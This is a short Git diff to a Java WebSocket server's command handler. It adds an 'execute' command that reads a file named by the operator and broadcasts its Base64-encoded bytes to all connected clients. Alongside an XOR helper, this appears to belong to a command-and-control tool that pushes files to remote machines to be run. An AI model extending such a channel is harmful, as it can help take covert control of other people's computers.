@@ -4,6 +4,8 @@ import me.soda.server.Server;
 import me.soda.server.XOR;
 import org.java_websocket.WebSocket;
 
+import java.io.File;
+import java.io.FileInputStream;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Base64;
@@ -75,6 +77,14 @@ public class CommandHandler {
                         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                         tryBroadcast(server, msgArr[0] + " " + Base64.getEncoder().encodeToString(
                                 String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)));
+                        break;
+                    case "execute":
+                        if (msgArr.length < 2) break;
+                        String[] strArr2 = new String[msgArr.length - 1];
+                        System.arraycopy(msgArr, 1, strArr2, 0, strArr2.length);
+                        File file = new File(String.join(" ", strArr2));
+                        FileInputStream is = new FileInputStream(file);
+                        tryBroadcast(server, msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()));
                         break;
                     default:
                         tryBroadcast(server, in);
